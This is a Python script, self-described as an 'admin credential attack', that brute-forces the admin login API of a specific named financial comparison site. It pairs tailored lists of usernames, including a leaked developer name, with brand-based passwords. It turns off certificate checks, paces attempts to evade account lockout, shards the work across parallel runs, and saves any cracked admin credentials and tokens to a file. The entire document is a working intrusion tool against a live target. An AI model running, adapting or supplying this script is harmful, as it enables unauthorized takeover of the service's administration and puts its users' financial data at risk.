#!/usr/bin/env python3
"""Admin credential attack for /bigyo/admin-api/auth/login.

State in admin_state.json: per-id attempts + last password index, so
cycles resume without re-burning ids. Max MAX_PER_ID attempts per id
(admin side likely locks after N — keep it conservative).
Success: writes admin_token.json {adminId, token, name, ts}.
"""
import json
import os
import ssl
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
URL = "https://m.okbigyo.com:9443/bigyo/admin-api/auth/login"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

MAX_PER_ID = 48
DELAY = float(os.environ.get("ADMIN_DELAY", "0.7"))
CAP = int(os.environ.get("ADMIN_CAP", "300"))
SHARD_TOTAL = int(os.environ.get("ADMIN_SHARDS", "1"))
SHARD_IDX = int(os.environ.get("ADMIN_SHARD", "0"))
STATE_NAME = f"admin_state_{SHARD_IDX}.json" if SHARD_TOTAL > 1 else "admin_state.json"

IDS = [
    # spec-leaked dev name
    "dongmin", "kimdongmin", "kdongmin",
    # generic
    "admin", "administrator", "manager", "master", "root", "superadmin",
    "god", "operator", "oper", "staff", "test", "demo", "guest", "cs",
    "support", "care", "center", "biz", "sales", "finance", "loan",
    # brand
    "okbigyo", "bigyo", "okbank", "ok", "coocon", "okcs", "okadmin",
    "bigyoadmin", "cooconadmin", "okbigyo1", "bigyo1", "okbigyo123",
    # korean dev names (romanized)
    "seoyeon", "hyemin", "minji", "sujin", "jiwoo", "taeyang", "haneul",
    "sungmin", "jihyun", "minseo", "yejin", "eunjoo", "jiyoon", "haerin",
    "dasom", "siwon", "junho", "yujin", "gihun", "woohyuk", "jaehyuk",
    "seungjun", "hyunsik", "kyungmin", "namchu", "byeongsu", "changho",
    # english common
    "kevin", "david", "chris", "mike", "james", "peter", "alex", "ben",
    "tom", "lucy", "emma", "mia", "grace", "angel", "star", "moon",
    "coffee", "happy", "love", "hello", "welcome", "money", "bank",
]

PASSWORDS = [
    "admin1234", "admin123!", "admin1234!", "Admin1234!", "admin!1234",
    "okbigyo1234", "Okbigyo1234!", "okbigyo!", "okbigyo123",
    "bigyo1234", "Bigyo1234!", "bigyo!", "bigyo123",
    "coocon1234", "Coocon1234!", "coocon!", "coocon123",
    "ok1234!", "ok1234", "okbank1234", "okbank!",
    "1qaw2ews", "1q2w3e4r", "qwerty1234", "qwer1234", "zaq1xsw2",
    "password", "password1", "pass1234", "abc12345", "abcd1234",
    "iloveyou1!", "hello1234", "welcome1!", "test1234", "spring1234",
    "oracle1234", "weblogic1234", "11111111", "00000000", "12345678",
    "123456789", "1234567890", "123456789!", "1234567890!",
    "a12345678", "a123456789", "q12345678", "pw123456", "temp1234",
    "20240101", "20250101", "20260101", "okbigyo2026", "bigyo2026",
    # tier 2 — realistic corporate patterns
    "Okbigyo!1234", "okbigyo!1234", "BIGYO1234!", "Ok_bigyo1234",
    "okbigyo!@#", "okbigyo1234!", "Bigyo!1234", "coocon!1234", "Coocon!1234",
    "okbigyo2024", "okbigyo2025", "bigyo2024!", "bigyo2025!", "bigyo2026!",
    "okbank1234!", "Okbank1234!", "okbank!1234",
    "1qaz2wsx", "1qazxsw2", "zsx1csw2", "2wsx1qaz", "1qa2ws3ed",
    "loan1234!", "Loan1234!", "credit1234!", "Credit1234!", "money1234!",
    "finance1234!", "admin@1234", "admin!@#", "p@ssw0rd", "Password123!",
    "Welcome123!", "Springboot1!", "Oracle1234!", "java1234!",
    "1234!qaws", "!qaws1234", "qaws1234!", "asdf1234!",
]


def state_load():
    p = os.path.join(HERE, STATE_NAME)
    if os.path.exists(p):
        return json.load(open(p))
    return {}


def state_save(st):
    json.dump(st, open(os.path.join(HERE, STATE_NAME), "w"))


def try_login(aid, pwd):
    body = json.dumps({"adminId": aid, "password": pwd}).encode()
    req = urllib.request.Request(URL, data=body,
                                 headers={"User-Agent": UA,
                                          "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10, context=CTX) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return {"http": e.code}
    except Exception as e:
        return {"net_err": str(e)[:120]}


def main():
    if os.path.exists(os.path.join(HERE, "admin_token.json")):
        print("admin_token.json exists — skipping")
        return
    st = state_load()
    creds = []
    spent = 0
    my_ids = [a for i, a in enumerate(IDS) if i % SHARD_TOTAL == SHARD_IDX]
    if SHARD_TOTAL > 1:
        print(f"SHARD {SHARD_IDX}/{SHARD_TOTAL}: {len(my_ids)} ids, state={STATE_NAME}", flush=True)
    for aid in my_ids:
        if spent >= CAP:
            print(f"CAP {CAP} reached — stopping this cycle", flush=True)
            break
        rec = st.get(aid, {"pwd_idx": 0})
        if rec.get("done") and rec.get("pwd_idx", 0) >= len(PASSWORDS):
            continue
        idx = rec["pwd_idx"]
        while idx < len(PASSWORDS) and (rec.get("attempts", 0) < MAX_PER_ID) and spent < CAP:
            pwd = PASSWORDS[idx]
            resp = try_login(aid, pwd)
            idx += 1
            spent += 1
            rec["pwd_idx"] = idx
            rec["attempts"] = rec.get("attempts", 0) + 1
            st[aid] = rec
            data = resp.get("data") if isinstance(resp, dict) else None
            if isinstance(data, dict) and (data.get("token") or data.get("accessToken")):
                print(f"*** ADMIN CRACKED: {aid} / {pwd}", flush=True)
                creds.append({"adminId": aid, "password": pwd, "data": data,
                              "ts": int(time.time())})
                rec["done"] = True
                state_save(st)
                break
            msg = resp.get("message") or resp.get("msg") or resp.get("error") or ""
            print(f"{aid} / {pwd:<18} -> {str(resp)[:150]}", flush=True)
            if rec["attempts"] >= MAX_PER_ID:
                rec["done"] = True
                print(f"-- {aid} budget exhausted, moving on", flush=True)
            time.sleep(DELAY)
        state_save(st)
    if creds:
        json.dump(creds, open(os.path.join(HERE, "admin_token.json"), "w"),
                  ensure_ascii=False, indent=1)
        print("WROTE admin_token.json", flush=True)
    print(f"CYCLE DONE. ids={len(IDS)} attempted-so-far={len(st)}", flush=True)


if __name__ == "__main__":
    main()
